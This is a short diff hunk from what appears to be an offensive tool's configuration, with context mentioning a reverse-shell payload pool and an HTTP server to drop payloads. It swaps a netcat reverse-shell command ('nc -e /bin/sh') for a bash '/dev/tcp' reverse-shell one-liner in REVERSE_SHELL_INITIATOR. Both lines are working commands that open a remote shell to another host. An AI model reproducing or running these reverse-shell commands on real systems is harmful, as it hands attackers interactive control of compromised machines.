@@ -16,7 +16,7 @@ REVERSE_SHELL_PAYLOAD_POOL = [
 ]
 
 # put any better reverse shell payload here 
-REVERSE_SHELL_INITIATOR =  "nc -e /bin/sh {TARGET} %s" % REVERSE_SHELL_PORT
+REVERSE_SHELL_INITIATOR = "bash -i >& /dev/tcp/{TARGET}/%s 0>&1" % REVERSE_SHELL_PORT
 
 # http server to drop reverse shell payload
 HTTP_CARRIER =  (
